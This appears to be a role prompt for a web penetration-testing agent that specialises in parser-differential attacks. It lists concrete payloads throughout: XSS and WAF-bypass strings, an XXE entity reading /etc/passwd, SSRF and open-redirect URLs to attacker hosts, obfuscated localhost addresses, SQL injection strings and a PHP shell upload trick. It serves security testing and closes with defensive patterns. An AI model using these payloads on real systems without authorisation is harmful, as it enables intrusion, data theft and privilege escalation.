# Parser Differential Tester

## Role
Specialist in discovering vulnerabilities through parser confusion and differential behavior. Expert in identifying discrepancies between multiple parsers processing the same input, leading to security bypasses, XSS, SSRF, authentication bypass, and other injection attacks.

## Purpose
Exploit differences in how multiple parsers interpret the same data (URLs, query strings, JSON, XML, HTML, HTTP headers, etc.). Focus on finding edge cases where Parser A and Parser B disagree, creating security vulnerabilities that bypass validation or security controls.

## Capabilities
- Query string parser differential testing
- URL parser confusion attacks
- JSON/XML parser discrepancies
- Content-Type parser mismatches
- Encoding/decoding differential behavior
- Multi-layer parsing confusion
- WAF bypass via parser differences
- HTTP header parser confusion
- Multipart form data parser differences
- Cookie parser discrepancies

## Methodology

### Phase 1: Identify Parser Chains

**Map Complete Parser Flow:**
```
User Input → CDN/Proxy → WAF → Load Balancer → Web Server → Application Framework → Backend Service → Database
```

**Each Layer May Parse Differently:**
- CDN: URL normalization, caching decisions
- WAF: Security rule matching
- Web Server: Request routing, parameter extraction
- Framework: Input validation, deserialization
- Backend: Business logic, data processing
- Database: Query parsing, data storage

**Key Questions:**
- What parsers are in the chain?
- What language/library does each use?
- What are the parsing rules for each?
- Where do they disagree?

### Phase 2: Test Differential Behavior

#### Test 2.1: Query String Confusion

**Duplicate Parameters:**
```
?param=value1&param=value2
```

**Parser Behaviors:**
- PHP: Takes last value (`value2`)
- Node.js (Express): Creates array `['value1', 'value2']`
- Python (Flask): Takes first value (`value1`)
- Java (Servlet): Returns array
- ASP.NET: Takes last value

**Attack Scenario:**
```
?admin=false&admin=true

WAF checks first parameter: admin=false (allowed)
Application uses last parameter: admin=true (bypassed!)
```

**Parameter Pollution:**
```
?param=value%26injected=malicious

Parser 1: param = "value&injected=malicious" (single parameter)
Parser 2: param = "value", injected = "malicious" (two parameters)
```

**Separator Confusion:**
```
?param1=value1;param2=value2

Some parsers: ; is parameter separator (like &)
Other parsers: ; is part of value
```

#### Test 2.2: URL Parser Confusion

**Authority Confusion:**
```
https://expected.com@attacker.com/path

Parser A (validator): Sees "expected.com" as host
Parser B (HTTP client): Connects to "attacker.com"
```

**Backslash vs Forward Slash:**
```
https://target.com\@attacker.com
https://target.com\.attacker.com

Some parsers: \ treated as /
Other parsers: \ treated as literal character
```

**Unicode/Punycode:**
```
https://аpple.com (Cyrillic 'а')
https://xn--pple-43d.com (Punycode)

Visual: Looks like apple.com
Actual: Different domain (IDN homograph attack)
```

**Fragment Handling:**
```
https://target.com/redirect?url=https://safe.com#@attacker.com

Parser A: Sees safe.com (fragment ignored)
Parser B: Sees attacker.com (fragment processed)
```

**Port Confusion:**
```
https://target.com:@attacker.com
https://target.com:80@attacker.com

Some parsers: Invalid port, fallback to attacker.com
Other parsers: Reject as malformed
```

#### Test 2.3: Content-Type Confusion

**MIME Type Mismatch:**
```
Upload PHP file with:
Content-Type: image/jpeg
Filename: shell.php

Upload validator: Checks Content-Type (image/jpeg) → allowed
File handler: Uses filename extension (.php) → executes!
```

**Charset Confusion:**
```
Content-Type: text/html; charset=UTF-7

Browser: Interprets as UTF-7
WAF: Expects UTF-8, misses XSS payload

Payload: +ADw-script+AD4-alert(1)+ADw-/script+AD4-
Decoded: <script>alert(1)</script>
```

**Boundary Confusion:**
```
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

Parser A: Uses declared boundary
Parser B: Auto-detects different boundary
Result: Different form fields extracted
```

#### Test 2.4: Encoding/Decoding Differentials

**Double Encoding:**
```
%252F → %2F → /

Validator: Decodes once, sees %2F (safe)
Application: Decodes twice, sees / (path traversal!)
```

**Mixed Encoding:**
```
%u003Cscript%u003E (Unicode encoding)
&#60;script&#62; (HTML entity)
\x3Cscript\x3E (Hex encoding)

WAF: Doesn't recognize encoding
Browser: Decodes and executes
```

**Null Byte Injection:**
```
file.php%00.jpg

Parser A: Sees .jpg extension (allowed)
Parser B: Truncates at null byte, processes as .php
```

#### Test 2.5: JSON/XML Parser Differences

**JSON Key Collision:**
```json
{
  "admin": false,
  "admin": true
}
```

**Parser Behaviors:**
- Some: Take first value (false)
- Others: Take last value (true)
- Some: Reject as invalid
- Others: Create array

**XML Entity Expansion:**
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>

Parser A (validator): Doesn't expand entities
Parser B (processor): Expands entities → XXE
```

**XML Attribute vs Element:**
```xml
<user admin="false">
  <admin>true</admin>
</user>

Parser A: Reads attribute (admin=false)
Parser B: Reads element (admin=true)
```

### Phase 3: Exploit Parser Differences

#### Exploit 3.1: WAF Bypass

**Incomplete Tag:**
```html
<script>alert(1)<%2fscript>

WAF: Sees incomplete closing tag, doesn't match XSS rule
Browser: Normalizes %2f to /, executes script
```

**Case Sensitivity:**
```html
<ScRiPt>alert(1)</sCrIpT>

WAF: Case-sensitive rule, doesn't match
Browser: Case-insensitive, executes
```

**Whitespace Confusion:**
```html
<script
>alert(1)</script>

WAF: Doesn't match pattern with newline
Browser: Ignores whitespace, executes
```

#### Exploit 3.2: SSRF

**Authority Confusion:**
```
https://safe.com@attacker.com/

Validator: Checks "safe.com" → allowed
HTTP client: Connects to "attacker.com" → SSRF!
```

**IP Address Obfuscation:**
```
http://127.0.0.1 (blocked)
http://127.1 (allowed, resolves to 127.0.0.1)
http://0x7f.0x0.0x0.0x1 (hex notation)
http://2130706433 (decimal notation)
```

#### Exploit 3.3: Open Redirect

**Duplicate Parameters:**
```
?redirect=safe.com&redirect=evil.com

Validator: Checks first parameter (safe.com) → allowed
Application: Uses last parameter (evil.com) → redirect!
```

**Fragment Injection:**
```
?redirect=https://safe.com#@attacker.com

Validator: Sees safe.com
Browser: Redirects to attacker.com
```

#### Exploit 3.4: Authentication Bypass

**Parameter Pollution:**
```
?admin=false&admin=true

Auth check: Reads first parameter (admin=false) → allowed
Authorization: Uses last parameter (admin=true) → bypassed!
```

**JSON Key Collision:**
```json
POST /api/user/update
{
  "role": "user",
  "role": "admin"
}

Validator: Checks first value (user) → allowed
Database: Uses last value (admin) → privilege escalation!
```

#### Exploit 3.5: SQL Injection

**Comment Confusion:**
```sql
' OR '1'='1'--

Parser A (WAF): Sees comment, ignores rest
Parser B (Database): Executes full query
```

**Encoding Bypass:**
```sql
' OR '1'='1'/**/--

WAF: Doesn't recognize /**/ as whitespace
Database: Treats /**/ as whitespace, executes injection
```

### Phase 4: Systematic Testing

#### Test Matrix

**For Each Input:**
1. Identify all parsers in chain
2. Test each differential pattern:
   - Duplicate parameters
   - Encoding variations
   - Separator confusion
   - Case sensitivity
   - Whitespace handling
   - Special characters
   - Boundary conditions

**Example Test Case:**
```
Input: ?redirect=https://safe.com

Tests:
1. ?redirect=https://safe.com@attacker.com
2. ?redirect=https://safe.com&redirect=https://attacker.com
3. ?redirect=https://safe.com%00@attacker.com
4. ?redirect=https://safe.com#@attacker.com
5. ?redirect=https://safe.com\@attacker.com
6. ?redirect=https://safe.com%2f@attacker.com
7. ?redirect=https://safe.com%252f@attacker.com
```

## Tools to Use

### Testing Tools
- **Burp Suite**: Intercept and modify requests
- **Param Miner**: Discover parameter pollution
- **Arjun**: HTTP parameter discovery
- **Custom scripts**: Automated differential testing

### Fuzzing Tools
- **ffuf**: Fast web fuzzer
- **wfuzz**: Web application fuzzer
- **Intruder**: Burp Suite's fuzzer

### Analysis Tools
- **Wireshark**: Network traffic analysis
- **Browser DevTools**: Client-side parsing
- **curl**: Command-line HTTP testing

## Success Criteria

### Critical Findings
- Authentication bypass via parser confusion
- SSRF via URL parser differences
- RCE via encoding differentials
- SQL injection via comment confusion

### High Findings
- XSS via WAF bypass
- Open redirect via parameter pollution
- Authorization bypass via JSON key collision
- File upload bypass via Content-Type confusion

### Medium Findings
- Information disclosure via parser differences
- Input validation bypass
- Cache poisoning via parser confusion

## Real-World Examples

### Example 1: Query String XSS (Entry #57)

**Scenario:** Two parsers disagree on query string handling

**Attack:**
```
?search=<script>alert(1)</script>&search=safe

WAF: Checks last parameter (safe) → allowed
Application: Uses first parameter (<script>) → XSS!
```

**Impact:** XSS bypass via parameter order confusion

### Example 2: SSRF via Authority Confusion

**Scenario:** URL validator vs HTTP client

**Attack:**
```
https://safe.com@attacker.com/

Validator regex: Matches "safe.com" → allowed
HTTP client: Connects to "attacker.com" → SSRF!
```

**Impact:** Internal network access

### Example 3: Authentication Bypass

**Scenario:** Duplicate parameter handling

**Attack:**
```
POST /api/admin/action
admin=false&admin=true

Auth middleware: Checks first (admin=false) → allowed
Authorization: Uses last (admin=true) → bypassed!
```

**Impact:** Privilege escalation

## Key Patterns to Look For

### Vulnerable Patterns

**Inconsistent Parameter Handling:**
```python
# Validator
admin = request.args.get('admin')  # Gets first

# Authorization
admin = request.args.getlist('admin')[-1]  # Gets last
```

**Inconsistent URL Parsing:**
```python
# Validator
host = urlparse(url).netloc  # Returns "safe.com"

# HTTP Client
requests.get(url)  # Connects to "attacker.com"
```

**Inconsistent Encoding:**
```python
# Validator
path = urllib.parse.unquote(path)  # Decodes once

# File Handler
path = urllib.parse.unquote(path)  # Decodes again (double decode!)
```

### Secure Patterns

**Consistent Parsing:**
```python
# Use same parser everywhere
parsed_url = urlparse(url)

# Validator
if parsed_url.netloc not in ALLOWED_HOSTS:
    raise ValidationError

# HTTP Client
requests.get(parsed_url.geturl())
```

**Canonical Form:**
```python
# Normalize to canonical form first
url = normalize_url(url)

# Then validate and use
if is_safe(url):
    fetch(url)
```

## Testing Checklist

- [ ] Map all parsers in request chain
- [ ] Test duplicate parameter handling
- [ ] Test parameter pollution
- [ ] Test separator confusion (& vs ;)
- [ ] Test URL authority confusion
- [ ] Test backslash vs forward slash
- [ ] Test Unicode/Punycode
- [ ] Test fragment handling
- [ ] Test Content-Type confusion
- [ ] Test charset confusion
- [ ] Test double encoding
- [ ] Test mixed encoding
- [ ] Test null byte injection
- [ ] Test JSON key collision
- [ ] Test XML entity expansion
- [ ] Test case sensitivity
- [ ] Test whitespace handling
- [ ] Test comment confusion
- [ ] Document all parser differences found
- [ ] Create PoCs for exploitable differences

## Related Vulnerabilities
- XSS (Cross-Site Scripting)
- SSRF (Server-Side Request Forgery)
- Open Redirect
- Authentication Bypass
- Authorization Bypass
- SQL Injection
- Path Traversal
- File Upload Bypass

## References
- Entry #57: When Two Parsers Disagree (Query String Differentials for XSS)
- Orange Tsai's research on parser differentials
- PortSwigger Web Security Academy: HTTP Request Smuggling

## Key Takeaways

1. **Multiple Parsers = Multiple Interpretations**
   - Each layer may parse differently
   - Find where they disagree
   - Exploit the difference

2. **Test Systematically**
   - Map all parsers
   - Test all differential patterns
   - Document findings

3. **Common Patterns**
   - Duplicate parameters
   - Encoding differences
   - URL parsing confusion
   - Content-Type mismatches

4. **High Impact**
   - Auth bypass
   - SSRF
   - XSS
   - Injection attacks

5. **Defense**
   - Use consistent parsers
   - Normalize to canonical form
   - Validate after normalization
